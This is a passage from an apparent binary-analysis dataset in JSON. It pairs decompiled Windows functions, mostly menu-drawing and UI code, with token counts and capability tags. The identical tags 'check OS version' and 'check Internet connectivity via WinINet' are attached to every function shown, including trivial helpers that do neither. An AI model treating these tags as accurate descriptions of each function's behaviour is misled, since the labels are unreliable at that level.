{\n        if ((*(arg_8h + -0x40) == 0) ||\n           (((iVar5 = *(*(arg_8h + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00453888(),  iVar6 <= iVar5)) &&\n            ((*(*(arg_8h + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(arg_8h + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')\n              ))))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(arg_8h + -0x41) = uVar4;\n        if ((*(arg_8h + -0x41) == '\\0') &&\n           ((piVar1 = *(*(arg_8h + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0')))\n           ) {\n            if ((*(arg_8h + -0x40) == 0) || (*(arg_8h + 8) != '\\0')) {\n                *(arg_8h + -0x10) = *(arg_8h + -8);\n                *(arg_8h + -4) = *(arg_8h + -0xc);\n            }\n            else {\n                *(arg_8h + -0x10) = *(arg_8h + -8) - *(*(arg_8h + -0x40) + 0x34);\n                *(arg_8h + -4) = *(arg_8h + -0xc) + *(*(arg_8h + -0x40) + 0x30);\n            }\n            *(arg_8h + -0x39) = 0;\n        }\n        else {\n            *(arg_8h + -0x39) = 1;\n            if (*(arg_8h + -0x41) == '\\0') {\n                *(arg_8h + -0x10) = *(arg_8h + -8) + -0x10;\n                *(arg_8h + -4) = *(arg_8h + -0xc) + 0x10;\n            }\n            else {\n                *(arg_8h + -0x10) = *(arg_8h + -8) - *(*(arg_8h + -0x40) + 0x34);\n                *(arg_8h + -4) = *(arg_8h + -0xc) + *(*(arg_8h + -0x40) + 0x30);\n            }\n            if (*(*(arg_8h + -0x38) + 0x38) != '\\0') {\n                *(arg_8h + -0x10) = *(arg_8h + -0x10) + -1;\n                *(arg_8h + -4) = *(arg_8h + -4) + 1;\n                uVar7 = fcn.004214cc();\n                *(arg_8h + -0x48) = uVar7;\n                if ((*(arg_8h + 0xc) & 1) == 0) {\n                    uVar7 = fcn.004214cc();\n                    *(arg_8h + -0x48) = uVar7;\n                    fcn.004285c8();\n                    fcn.004214a8();\n                    fcn.00421878();\n                }\n                else {\n                    fcn.004214d4();\n                    fcn.00421878();\n                }\n                fcn.004214d4();\n                *(arg_8h + -8) = *(arg_8h + -8) + -1;\n                *(arg_8h + -0xc) = *(arg_8h + -0xc) + 1;\n            }\n            if (*(arg_8h + -0x41) == '\\0') {\n                *(arg_8h + -0x5c) = *(arg_8h + -0x10);\n                *(arg_8h + -0x58) = *(arg_8h + -0xc);\n                *(arg_8h + -0x54) = *(arg_8h + -8);\n                *(arg_8h + -0x50) = *(arg_8h + -4);\n                iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(arg_8h + -8) - *(arg_8h + -0x10)) {\n                    iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(arg_8h + -8) - *(arg_8h + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(arg_8h + -8) = (*(arg_8h + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x2c))();\n                    *(arg_8h + -0x10) = *(arg_8h + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(arg_8h + -4) - *(arg_8h + -0xc)) {\n                    iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(arg_8h + -4) - *(arg_8h + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(arg_8h + -0xc) = iVar5 + *(arg_8h + -0xc) + 1;\n                    iVar5 = (**(**(*(arg_8h + -0x38) + 0x4c) + 0x20))();\n                    *(arg_8h + -4) = iVar5 + *(arg_8h + -0xc);\n                }\n                fcn.00421a3c();\n                *(arg_8h + -0x10) = *(arg_8h + -0x5c);\n                *(arg_8h + -0xc) = *(arg_8h + -0x58);\n                *(arg_8h + -8) = *(arg_8h + -0x54);\n                *(arg_8h + -4) = *(arg_8h + -0x50);\n            }\n            else {\n                iVar5 = *(*(arg_8h + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00453888(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00426010();\n                    *(arg_8h + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(arg_8h + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.00427258();\n                    *(arg_8h + -0x48) = *(*(*(arg_8h + -0x28) + 0xc) + 0x18);\n                    fcn.00420c18();\n                    iVar5 = *(arg_8h + -0x4c);\n                    iVar6 = (**(**(arg_8h + -0x4c) + 0x20))();\n                    uVar8 = (*(arg_8h + -4) - *(arg_8h + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(arg_8h + -0x4c) + 0x2c))(iVar6 + *(arg_8h + -0xc) + 1);\n                    fcn.004217cc(iVar5);\n                    fcn.00420c18();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00403f58(0x43ba69);\n                    return;\n                }\n                fcn.00453da0(*(*(arg_8h + -0x38) + 0x39), *(*(arg_8h + -0x38) + 0x40), *(arg_8h + -0xc));\n            }\n            if (*(*(arg_8h + -0x38) + 0x38) != '\\0') {\n                *(arg_8h + -8) = *(arg_8h + -8) + -1;\n                *(arg_8h + -4) = *(arg_8h + -4) + -1;\n            }\n        }\n    }\n    *(arg_8h + -0x10) = *(arg_8h + -0x10) + -1;\n    *(arg_8h + -0xc) = *(arg_8h + -0xc) + -1;\n    *(arg_8h + -8) = *(arg_8h + -8) + 2;\n    *(arg_8h + -4) = *(arg_8h + -4) + 2;\n    if ((*(*(arg_8h + -0x38) + 0x38) != '\\0') ||\n       (((*(arg_8h + -0x29) != '\\0' && (*(arg_8h + -0x39) != '\\0')) && (*(arg_8h + -0x21) == '\\0')))) {\n        uVar7 = fcn.00421c8c();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(arg_8h + -0x29) != '\\0') {\n        if (*(arg_8h + -0x39) != '\\0') {\n            *(arg_8h + -0x18) = *(arg_8h + -0x10) + -1;\n        }\n        if ((*(arg_8h + -0x5d) == '\\0') || (*(arg_8h + 8) == '\\0')) {\n            fcn.004214d4();\n        }\n        fcn.00421878();\n    }\n    if (((*(arg_8h + 8) != '\\0') && (*(arg_8h + -0x5d) != '\\0')) &&\n       ((*(arg_8h + -0x21) == '\\0' || (*(arg_8h + -0x22) == '\\0')))) {\n        if (*(arg_8h + -0x29) == '\\0') {\n            if ((*(arg_8h + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.00421c8c();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.00421c8c();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(arg_8h + -0x29) == '\\0') {\n            iStack32 = arg_8h + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(arg_8h + -0x29) == '\\0') || (*(arg_8h + -0x39) == '\\0')) {\n        *(arg_8h + -0x18) = *(arg_8h + -0x10) + -1;\n    }\n    *(arg_8h + -0x20) = *(arg_8h + -0x20) + 2;\n    *(arg_8h + -0x18) = *(arg_8h + -0x18) + -1;\n    *(arg_8h + -100) = *(*(arg_8h + -0x31) * 2 + 0x4915a8) | 0x60;\n    if ((*(arg_8h + -0x65) != '\\0') && ((*(arg_8h + 0xd) & 1) != 0)) {\n        *(arg_8h + -100) = *(arg_8h + -100) | 0x100000;\n    }\n    *(arg_8h + -0x5c) = *(arg_8h + -0x20);\n    *(arg_8h + -0x58) = *(arg_8h + -0x1c);\n    *(arg_8h + -0x54) = *(arg_8h + -0x18);\n    *(arg_8h + -0x50) = *(arg_8h + -0x14);\n    if ((*(arg_8h + 0xc) & 0x20) != 0) {\n        fcn.00420fa4();\n    }\n    fcn.0043a908(*(arg_8h + -100) | 0x500, *(arg_8h + -0x29), arg_8h + -0x20);\n    *(arg_8h + -0x20) = *(arg_8h + -0x5c);\n    *(arg_8h + -0x18) = *(arg_8h + -0x54);\n    uVar8 = (*(arg_8h + -0x50) - *(arg_8h + -0x58)) - (*(arg_8h + -0x14) - *(arg_8h + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(arg_8h + -0x20, 0, iVar5);\n    if (((*(arg_8h + 8) != '\\0') && (*(arg_8h + -0x29) != '\\0')) && (*(arg_8h + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(arg_8h + -0x20, 1, 0);\n    }\n    fcn.0043a908(*(arg_8h + -100), *(arg_8h + -0x29), arg_8h + -0x20);\n    if ((*(*(arg_8h + -0x38) + 0x60) != 0) && (*(arg_8h + 8) == '\\0')) {\n        fcn.00439964();\n        *(arg_8h + -0x20) = 10;\n        iVar5 = fcn.00421ac0();\n        *(arg_8h + -0x18) = iVar5 + *(arg_8h + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.0043a908(2, *(arg_8h + -0x29), arg_8h + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00404da0(0x43be29);\n    return;\n}\n",
        "token_count": 4409
    },
    "0043b780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043b780(uint lprc)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb8;\n    uint var_4h;\n    \n    fcn.004285c8();\n    fcn.004214a8();\n    fcn.00421878();\n    fcn.004214d4();\n    piVar1 = *(unaff_EBP + 8) + -8;\n    *piVar1 = *piVar1 + -1;\n    piVar1 = *(unaff_EBP + 8) + -0xc;\n    *piVar1 = *piVar1 + 1;\n    if (*(*(unaff_EBP + 8) + -0x41) == '\\0') {\n        iVar6 = *(unaff_EBP + 8);\n        iVar3 = *(unaff_EBP + 8);\n        *(iVar3 + -0x5c) = *(iVar6 + -0x10);\n        *(iVar3 + -0x58) = *(iVar6 + -0xc);\n        *(iVar3 + -0x54) = *(iVar6 + -8);\n        *(iVar3 + -0x50) = *(iVar6 + -4);\n        iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x2c))();\n        if (iVar6 < *(*(unaff_EBP + 8) + -8) - *(*(unaff_EBP + 8) + -0x10)) {\n            iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x2c))();\n            uVar5 = (*(*(unaff_EBP + 8) + -8) - *(*(unaff_EBP + 8) + -0x10)) - iVar6;\n            iVar6 = uVar5 >> 1;\n            if (iVar6 < 0) {\n                iVar6 = iVar6 + ((uVar5 & 1) != 0);\n            }\n            *(*(unaff_EBP + 8) + -8) = (*(*(unaff_EBP + 8) + -8) - iVar6) + 1;\n            iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x2c))();\n            *(*(unaff_EBP + 8) + -0x10) = *(*(unaff_EBP + 8) + -8) - iVar6;\n        }\n        iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x20))();\n        if (iVar6 < *(*(unaff_EBP + 8) + -4) - *(*(unaff_EBP + 8) + -0xc)) {\n            iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x20))();\n            uVar5 = (*(*(unaff_EBP + 8) + -4) - *(*(unaff_EBP + 8) + -0xc)) - iVar6;\n            iVar6 = uVar5 >> 1;\n            if (iVar6 < 0) {\n                iVar6 = iVar6 + ((uVar5 & 1) != 0);\n            }\n            *(*(unaff_EBP + 8) + -0xc) = iVar6 + *(*(unaff_EBP + 8) + -0xc) + 1;\n            iVar6 = (**(**(*(*(unaff_EBP + 8) + -0x38) + 0x4c) + 0x20))();\n            *(*(unaff_EBP + 8) + -4) = iVar6 + *(*(unaff_EBP + 8) + -0xc);\n        }\n        fcn.00421a3c();\n        iVar6 = *(unaff_EBP + 8);\n        iVar3 = *(unaff_EBP + 8);\n        *(iVar3 + -0x10) = *(iVar6 + -0x5c);\n        *(iVar3 + -0xc) = *(iVar6 + -0x58);\n        *(iVar3 + -8) = *(iVar6 + -0x54);\n        *(iVar3 + -4) = *(iVar6 + -0x50);\n    }\n    else {\n        iVar6 = *(*(*(unaff_EBP + 8) + -0x38) + 0x40);\n        if ((iVar6 < 0) || (iVar3 = fcn.00453888(),  iVar3 <= iVar6)) {\n            uVar4 = fcn.00426010();\n            *(*(unaff_EBP + 8) + -0x4c) = uVar4;\n            *in_FS_OFFSET = &stack0xfffffff4;\n            (**(**(*(unaff_EBP + 8) + -0x4c) + 0x3c))();\n            sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n            fcn.00427258();\n            *(*(unaff_EBP + 8) + -0x48) = *(*(*(*(unaff_EBP + 8) + -0x28) + 0xc) + 0x18);\n            fcn.00420c18();\n            uVar4 = *(*(unaff_EBP + 8) + -0x4c);\n            iVar3 = (**(**(*(unaff_EBP + 8) + -0x4c) + 0x20))();\n            iVar6 = *(*(unaff_EBP + 8) + -0xc);\n            uVar5 = (*(*(unaff_EBP + 8) + -4) - iVar6) - iVar3;\n            iVar3 = uVar5 >> 1;\n            if (iVar3 < 0) {\n                iVar3 = iVar3 + ((uVar5 & 1) != 0);\n            }\n            (**(**(*(unaff_EBP + 8) + -0x4c) + 0x2c))(iVar3 + iVar6 + 1);\n            fcn.004217cc(uVar4);\n            fcn.00420c18();\n            *in_FS_OFFSET = uVar4;\n            fcn.00403f58(0x43ba69);\n            return;\n        }\n        fcn.00453da0(*(*(*(unaff_EBP + 8) + -0x38) + 0x39), *(*(*(unaff_EBP + 8) + -0x38) + 0x40), \n                     *(*(unaff_EBP + 8) + -0xc));\n    }\n    if (*(*(*(unaff_EBP + 8) + -0x38) + 0x38) != '\\0') {\n        piVar1 = *(unaff_EBP + 8) + -8;\n        *piVar1 = *piVar1 + -1;\n        piVar1 = *(unaff_EBP + 8) + -4;\n        *piVar1 = *piVar1 + -1;\n    }\n    piVar1 = *(unaff_EBP + 8) + -0x10;\n    *piVar1 = *piVar1 + -1;\n    piVar1 = *(unaff_EBP + 8) + -0xc;\n    *piVar1 = *piVar1 + -1;\n    piVar1 = *(unaff_EBP + 8) + -8;\n    *piVar1 = *piVar1 + 2;\n    piVar1 = *(unaff_EBP + 8) + -4;\n    *piVar1 = *piVar1 + 2;\n    if ((*(*(*(unaff_EBP + 8) + -0x38) + 0x38) != '\\0') ||\n       (((*(*(unaff_EBP + 8) + -0x29) != '\\0' && (*(*(unaff_EBP + 8) + -0x39) != '\\0')) &&\n        (*(*(unaff_EBP + 8) + -0x21) == '\\0')))) {\n        uVar4 = fcn.00421c8c(*(unaff_EBP + 8) + -0x10, *(*(*(*(unaff_EBP + 8) + -0x38) + 0x38) * 4 + 0x4915b0), 0xf);\n        sub.user32.dll_DrawEdge(uVar4);\n    }\n    if (*(*(unaff_EBP + 8) + -0x29) != '\\0') {\n        if (*(*(unaff_EBP + 8) + -0x39) != '\\0') {\n            *(*(unaff_EBP + 8) + -0x18) = *(*(unaff_EBP + 8) + -0x10) + -1;\n        }\n        if ((*(*(unaff_EBP + 8) + -0x5d) == '\\0') || (*(*(unaff_EBP + 8) + 8) == '\\0')) {\n            fcn.004214d4();\n        }\n        fcn.00421878();\n    }\n    if (((*(*(unaff_EBP + 8) + 8) != '\\0') && (*(*(unaff_EBP + 8) + -0x5d) != '\\0')) &&\n       ((*(*(unaff_EBP + 8) + -0x21) == '\\0' || (*(*(unaff_EBP + 8) + -0x22) == '\\0')))) {\n        if (*(*(unaff_EBP + 8) + -0x29) == '\\0') {\n            if ((*(*(unaff_EBP + 8) + 0xc) & 0x40) != 0) {\n                uVar4 = fcn.00421c8c(*(unaff_EBP + 8) + -0x20, 4, 0xf);\n                sub.user32.dll_DrawEdge(uVar4);\n            }\n        }\n        else {\n            uVar4 = fcn.00421c8c(*(unaff_EBP + 8) + -0x20, 2, 0xf);\n            sub.user32.dll_DrawEdge(uVar4);\n        }\n        if (*(*(unaff_EBP + 8) + -0x29) == '\\0') {\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(*(unaff_EBP + 8) + -0x29) == '\\0') || (*(*(unaff_EBP + 8) + -0x39) == '\\0')) {\n        *(*(unaff_EBP + 8) + -0x18) = *(*(unaff_EBP + 8) + -0x10) + -1;\n    }\n    piVar1 = *(unaff_EBP + 8) + -0x20;\n    *piVar1 = *piVar1 + 2;\n    piVar1 = *(unaff_EBP + 8) + -0x18;\n    *piVar1 = *piVar1 + -1;\n    *(*(unaff_EBP + 8) + -100) = *(*(*(unaff_EBP + 8) + -0x31) * 2 + 0x4915a8) | 0x60;\n    if ((*(*(unaff_EBP + 8) + -0x65) != '\\0') && ((*(*(unaff_EBP + 8) + 0xd) & 1) != 0)) {\n        puVar2 = *(unaff_EBP + 8) + -100;\n        *puVar2 = *puVar2 | 0x100000;\n    }\n    iVar6 = *(unaff_EBP + 8);\n    iVar3 = *(unaff_EBP + 8);\n    *(iVar3 + -0x5c) = *(iVar6 + -0x20);\n    *(iVar3 + -0x58) = *(iVar6 + -0x1c);\n    *(iVar3 + -0x54) = *(iVar6 + -0x18);\n    *(iVar3 + -0x50) = *(iVar6 + -0x14);\n    if ((*(*(unaff_EBP + 8) + 0xc) & 0x20) != 0) {\n        fcn.00420fa4();\n    }\n    fcn.0043a908(*(*(unaff_EBP + 8) + -100) | 0x500, *(*(unaff_EBP + 8) + -0x29), *(unaff_EBP + 8) + -0x20);\n    *(*(unaff_EBP + 8) + -0x20) = *(*(unaff_EBP + 8) + -0x5c);\n    *(*(unaff_EBP + 8) + -0x18) = *(*(unaff_EBP + 8) + -0x54);\n    uVar5 = (*(*(unaff_EBP + 8) + -0x50) - *(*(unaff_EBP + 8) + -0x58)) -\n            (*(*(unaff_EBP + 8) + -0x14) - *(*(unaff_EBP + 8) + -0x1c));\n    iVar6 = uVar5 >> 1;\n    if (iVar6 < 0) {\n        iVar6 = iVar6 + ((uVar5 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(*(unaff_EBP + 8) + -0x20, 0, iVar6);\n    if (((*(*(unaff_EBP + 8) + 8) != '\\0') && (*(*(unaff_EBP + 8) + -0x29) != '\\0')) &&\n       (*(*(unaff_EBP + 8) + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(*(unaff_EBP + 8) + -0x20, 1, 0);\n    }\n    fcn.0043a908(*(*(unaff_EBP + 8) + -100), *(*(unaff_EBP + 8) + -0x29), *(unaff_EBP + 8) + -0x20);\n    if ((*(*(*(unaff_EBP + 8) + -0x38) + 0x60) != 0) && (*(*(unaff_EBP + 8) + 8) == '\\0')) {\n        fcn.00439964();\n        *(*(unaff_EBP + 8) + -0x20) = 10;\n        iVar6 = fcn.00421ac0();\n        *(*(unaff_EBP + 8) + -0x18) = iVar6 + *(*(unaff_EBP + 8) + -0x20);\n        in_stack_ffffffb8 = 2;\n        fcn.0043a908(2, *(*(unaff_EBP + 8) + -0x29), *(unaff_EBP + 8) + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00404da0(0x43be29);\n    return;\n}\n",
        "token_count": 3466
    },
    "0043be40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043be40(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.0043c984();\n    iVar3 = fcn.0043bf98();\n    cVar1 = fcn.0040cdd4();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.00437d14(),  *(iVar4 + 5) != '\\0')) {\n        (***0x492974)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.0043e204(),  cVar1 != '\\0')) {\n            fcn.0043b4c0(&stack0xfffffffc);\n        }\n        else {\n            fcn.0043ab60(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "0043bf98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0043bf98(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.0043c984();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "0043c014": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c014(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack60 = 0x43c1f6;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.00404154();\n    cVar2 = fcn.004040e4();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.0043bfc8(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.0043c984();\n    var_10h = fcn.0043bf98();\n    fcn.004051b0();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_10h == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if (*(in_EAX + 0x4c) != 0) {\n            cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))();\n            if (cVar2 == '\\0') {\n                *var_4h = 0x10;\n                if (!bVar5) {\n                    *arg_8h = 0x10;\n                }\n                bVar1 = true;\n                goto code_r0x0043c0ff;\n            }\n        }\n        *var_4h = -7;\n        bVar1 = false;\n    }\n    else {\n        *var_4h = *(var_10h + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_10h + 0x30);\n        }\n        bVar1 = true;\n    }\ncode_r0x0043c0ff:\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00403720();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004040e4();\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = *0x60;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.00404e38();\n    }\n    else {\n        fcn.00439964();\n        fcn.004050b0();\n    }\n    uVar4 = *(uVar4 * 2 + 0x4915b8) | 0x560;\n    fcn.0043a908(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00404da0(0x43c1fd);\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 954
    },
    "0043c250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043c250(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.0043c3c4(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0043c3d4();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.0043c29c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0043c29c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c29c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.0043a878(*(in_EAX + 0x50), *(param_2 * 4 + 0x491540));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043c250();\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0043c368": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c368(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.0043c72c();\n            fcn.0043a818();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0043c250();\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0043c3d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043c3d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.004398b8();\n    }\n    fcn.00414eec();\n    return;\n}\n",
        "token_count": 64
    },
    "0043c550": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
